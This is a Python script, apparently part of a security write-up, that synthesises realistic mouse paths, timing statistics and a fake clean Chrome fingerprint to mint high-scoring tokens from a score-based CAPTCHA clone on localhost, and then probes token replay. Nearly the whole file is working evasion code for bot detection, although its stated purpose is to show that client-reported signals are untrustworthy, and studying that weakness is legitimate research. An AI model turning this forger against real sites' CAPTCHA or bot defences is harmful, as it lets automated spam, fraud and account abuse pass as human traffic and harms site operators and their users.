# forge.py — synthesise a human-plausible signal bundle and mint a high-scoring
# token against your OWN clone. stdlib only (urllib). Target: http://localhost:8777
#
# This is Part 3.1 of the write-up: the point is NOT that the mouse curve is pretty, it is that
# the server scores from the client's own description of the client's own behaviour. A minimum-jerk
# velocity profile + quadratic Bezier + overshoot-and-correct + micro-jitter defeats even a server
# that recomputes features from a raw event stream, because the raw stream is still client-supplied.
import json, math, random, urllib.request, urllib.parse

BASE = "http://localhost:8777"

def post_json(path, obj):
    req = urllib.request.Request(BASE+path, data=json.dumps(obj).encode(),
          headers={"Content-Type":"application/json", "Origin":"http://localhost:8777"})
    with urllib.request.urlopen(req) as r: return json.loads(r.read())

def post_form(path, fields):
    req = urllib.request.Request(BASE+path, data=urllib.parse.urlencode(fields).encode(),
          headers={"Content-Type":"application/x-www-form-urlencoded"})
    with urllib.request.urlopen(req) as r: return json.loads(r.read())

# ---- human-plausible path generator ----
def min_jerk(t):                 # eased progress; zero velocity at both ends
    return 10*t**3 - 15*t**4 + 6*t**5

def human_path(x0, y0, x1, y1, base_dt=16.0):
    dist = math.hypot(x1-x0, y1-y0)
    dur  = 200 + dist*1.2 + random.gauss(0, 40)      # Fitts-ish duration + noise
    n    = max(10, int(dur / base_dt))
    mx, my = (x0+x1)/2, (y0+y1)/2                     # curved control point:
    nx, ny = -(y1-y0), (x1-x0); L = math.hypot(nx, ny) or 1   # perpendicular offset
    off = random.uniform(-0.25, 0.25) * dist
    cx, cy = mx + nx/L*off, my + ny/L*off
    pts, t_ms = [], 0.0
    for i in range(n+1):
        e = min_jerk(i/n); u = 1-e                    # Bezier P0->C->P1 at eased param
        bx = u*u*x0 + 2*u*e*cx + e*e*x1 + random.gauss(0, 0.6)   # + micro-jitter
        by = u*u*y0 + 2*u*e*cy + e*e*y1 + random.gauss(0, 0.6)
        dt = base_dt + random.gauss(0, 3)             # frame jitter
        if random.random() < 0.03: dt += random.uniform(40, 120)  # occasional pause
        t_ms += max(1.0, dt)
        pts.append({"x": round(bx,1), "y": round(by,1), "t": round(t_ms,1)})
    if len(pts) >= 4:                                 # overshoot then correct
        ox, oy = (x1-x0)/dist, (y1-y0)/dist
        pts[-3]["x"] += ox*random.uniform(3,9); pts[-3]["y"] += oy*random.uniform(3,9)
        pts[-2]["x"] += ox*random.uniform(1,4); pts[-2]["y"] += oy*random.uniform(1,4)
    return pts

# ---- feature functions mirroring score.js (so the bundle is internally consistent) ----
def entropy(m):
    if len(m) < 3: return 0.0
    bins=[0]*16; nn=0
    for i in range(1,len(m)):
        dx=m[i]["x"]-m[i-1]["x"]; dy=m[i]["y"]-m[i-1]["y"]
        if dx==0 and dy==0: continue
        bins[min(15,int((math.atan2(dy,dx)+math.pi)/(2*math.pi)*16))]+=1; nn+=1
    if not nn: return 0.0
    h=-sum((c/nn)*math.log2(c/nn) for c in bins if c)
    return h/4.0
def straightness(m):
    if len(m)<3: return 1.0
    L=sum(math.hypot(m[i]["x"]-m[i-1]["x"], m[i]["y"]-m[i-1]["y"]) for i in range(1,len(m)))
    net=math.hypot(m[-1]["x"]-m[0]["x"], m[-1]["y"]-m[0]["y"])
    return net/L if L else 1.0
def cv(m):
    if len(m)<4: return 0.0
    d=[m[i]["t"]-m[i-1]["t"] for i in range(1,len(m))]
    mn=sum(d)/len(d)
    return (math.sqrt(sum((x-mn)**2 for x in d)/len(d))/mn) if mn else 0.0

# ---- assemble a bundle a real desktop Chrome would plausibly produce ----
def forged_bundle(action="submit_contact"):
    path=[]
    for (a,b) in [((120,540),(300,300)),((300,300),(520,360)),((520,360),(610,470))]:
        seg=human_path(*a,*b); base=path[-1]["t"] if path else 0.0
        for p in seg: p["t"]+=base
        path+=seg
    return {
        "sitekey":"clone-site-key-123", "action":action,
        "timeToExecuteMs": 4200 + random.uniform(-400,400),   # a real, unhurried submit
        "dwellMs": 9000 + random.uniform(-1000,1000),
        "counts": {"mouse":len(path), "scroll":3, "key":24, "click":1},
        "behaviour": {"pathEntropy":entropy(path), "straightness":straightness(path),
                      "mouseTimingCV":cv(path), "keystrokeCV":0.55, "scrolled":True},
        "fingerprint": {                                       # coherent, clean desktop Chrome
            "canvas":"a91f3c22", "webgl_vendor":"Intel Inc.",
            "webgl_renderer":"Intel Iris OpenGL Engine",
            "screen":{"w":1920,"h":1080,"aw":1920,"ah":1040,"cd":24,"dpr":1},
            "win":{"iw":1280,"ih":720,"ow":1280,"oh":800},
            "hardwareConcurrency":8, "deviceMemory":8, "timezone":"America/New_York",
            "tzOffset":300, "languages":["en-US","en"], "platform":"Win32",
            "ua":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
                 "(KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
            "pluginCount":5, "mimeCount":2, "notif":"default",
            "webdriver":False, "artefacts":[], "uaCoherent":True },
        "clientTs": 0 }

if __name__ == "__main__":
    b = forged_bundle()
    print("features:  entropy=%.2f  straightness=%.2f  CV=%.2f"
          % (b["behaviour"]["pathEntropy"], b["behaviour"]["straightness"],
             b["behaviour"]["mouseTimingCV"]))
    token = post_json("/mint", b)["token"]
    print("minted token:", token[:40], "...")
    print("submit result:", json.dumps(post_form("/submit", {"captcha_token": token}), indent=2))
    print()
    # ---- Part 3.2: token replay probe. Nonce must reject the 2nd use. ----
    t2 = post_json("/mint", forged_bundle())["token"]
    print("replay 1st:", post_form("/submit", {"captcha_token": t2})["allowed"])
    print("replay 2nd:", post_form("/submit", {"captcha_token": t2}))
